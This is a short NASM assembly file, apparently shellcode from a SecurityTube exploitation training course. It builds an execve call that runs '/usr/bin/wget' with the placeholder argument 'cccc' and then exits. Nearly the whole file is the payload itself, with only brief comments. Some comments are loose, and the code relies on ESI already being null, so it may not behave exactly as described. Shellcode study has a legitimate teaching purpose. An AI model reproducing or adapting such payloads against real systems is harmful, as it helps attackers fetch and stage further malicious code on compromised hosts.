; Filename: .nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	xor ecx, ecx
	mul ecx ; this one instruction sets both eax and edx to 0, this is because mul 		results are stored in EAX and EDX
	push eax
	mov cl, 11
a:
	inc eax
	loop a

	push 0x63636363

	mov ecx, esp ; the null and "cccc" get moved to ecx
	push edx
	push 0x74 ;t
	push 0x6567772f ;egw/
	push 0x6e69622f ;nib/
	push 0x7273752f ;rsu/
	mov ebx, esp ; they then get moved into ebx
	push esi ; push a null
	mov esi, ecx ; move ecx args into esi (0x0,0x63636363)
	push esi
	push ebx
	mov ecx, esp
	int 0x80
	inc edx
	mov eax, edx
	int 0x80


